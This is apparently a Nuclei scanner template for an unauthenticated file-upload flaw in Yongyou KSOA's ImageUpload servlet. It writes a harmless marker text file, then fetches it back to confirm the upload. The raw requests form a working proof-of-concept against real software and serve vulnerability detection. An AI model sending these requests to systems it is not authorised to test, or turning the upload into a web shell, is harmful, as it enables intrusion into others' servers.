id: yongyou-KSOA-ImageUpload-upload

info:
  name: yongyou-KSOA-ImageUpload-upload
  author: rum3ch
  severity: critical
  tags: yongyou

requests:
  - raw:
      - |              
        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=helloyongyouKSOA.txt HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 3

        helloyongyouKSOA
        
      - |              
        GET /pictures/helloyongyouKSOA.txt HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 3

        helloyongyouKSOA        
    matchers-condition: and               
    matchers:
      - type: word
        words:
          - "hello"
          - "yongyouKSOA"
        condition: and
      - type: status
        status:
          - 200